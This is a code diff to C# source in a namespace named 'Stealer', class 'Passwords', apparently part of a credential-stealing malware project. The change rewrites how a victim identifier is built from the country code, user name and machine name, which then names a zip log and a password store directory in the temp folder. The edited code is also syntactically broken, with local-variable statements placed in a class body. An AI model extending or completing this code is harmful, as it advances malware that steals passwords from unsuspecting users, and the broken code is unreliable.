@@ -1071,9 +1071,13 @@ namespace Stealer
 	    internal sealed class Passwords
     {
 	
-		
-	static	 string compid=RegionInfo.CurrentRegion.EnglishName+(Environment.UserName)+(Environment.MachineName);
-static string id = Regex.Replace(compid, "[^a-zA-Z0-9]", "");
+		    var regions = CultureInfo.GetCultures(CultureTypes.SpecificCultures).Select(x => new RegionInfo(x.LCID));
+                var englishRegion = regions.FirstOrDefault(region => region.EnglishName.Contains(RegionInfo.CurrentRegion.EnglishName));
+                string countryAbbrev = englishRegion.TwoLetterISORegionName;	
+			
+string compid=countryAbbrev+(Environment.UserName)+(Environment.MachineName);
+string id = Regex.Replace(compid, "[^a-zA-Z0-9]", "").ToLower();
+		    
 static string ziplog = Path.Combine(Path.GetTempPath(), id + ".zip" );
 
 		 private static string PasswordsStoreDirectory = Path.Combine(Path.GetTempPath(),id );
